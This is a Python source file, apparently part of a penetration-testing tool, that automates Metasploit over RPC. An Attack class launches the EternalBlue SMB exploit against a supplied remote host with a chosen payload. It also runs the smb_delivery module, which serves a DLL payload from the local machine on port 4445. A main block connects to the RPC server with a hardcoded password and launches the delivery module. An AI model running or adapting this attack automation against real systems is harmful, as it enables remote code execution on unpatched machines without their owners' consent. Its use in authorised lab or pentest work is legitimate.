from pymetasploit3.msfrpc import MsfRpcClient, ExploitModule, PostModule, EncoderModule, AuxiliaryModule, NopModule, \
    PayloadModule

from libs.Modules import Modules
from libs.Payloads import *
from libs.Tools import get_ipv4


class Attack:
    __rpc: MsfRpcClient
    __rhost: str
    __module_path: Modules
    __payload: Payloads
    __module: ExploitModule | PostModule | EncoderModule | AuxiliaryModule | NopModule | PayloadModule

    def __init__(self,
                 rpc: MsfRpcClient,
                 rhost: str = None,
                 module: Modules = None,
                 payload: Payloads = None):
        self.__rpc = rpc
        self.__rhost = rhost
        self.__module_path = module
        self.__payload = payload
        self.__ipv4 = get_ipv4()
        print('initialize successful')

    def setModule(self, module: Modules):
        self.__module_path = module

    def setPayload(self, payload: Payloads):
        self.__payload = payload

    def run_eternal_blue(self):
        first_slash_index = self.__module_path.value.find('/')
        mtype = self.__module_path.value[:first_slash_index]
        mname = self.__module_path.value[first_slash_index + 1:]
        self.__module = self.__rpc.modules.use(mtype, mname)
        self.__module['RHOSTS'] = self.__rhost
        print(
            self.__rpc.consoles
            .console(self.__rpc.consoles.console().cid)
            .run_module_with_output(self.__module, PayloadModule(self.__rpc, self.__payload.value))
        )

    def run_smb_delivery(self):
        first_slash_index = self.__module_path.value.find('/')
        mtype = self.__module_path.value[:first_slash_index]
        mname = self.__module_path.value[first_slash_index + 1:]
        self.__module = self.__rpc.modules.use(mtype, mname)
        self.__module.target = 0  # {0: 'DLL', 1: 'PSH'}
        self.__module["SRVHOST"] = self.__ipv4
        self.__module['SRVPORT'] = 4445
        cid = self.__rpc.consoles.console().cid
        console = self.__rpc.consoles.console(cid)
        print(
            console.run_module_with_output(self.__module)
        )
        print(console.read())
        # Maybe show in GUI
    


if __name__ == '__main__':
    client = MsfRpcClient("salt", port=55553, ssl=True)

    atk = Attack(client)
    atk.setModule(Modules.SMB_DELIVERY)
    atk.run_smb_delivery()
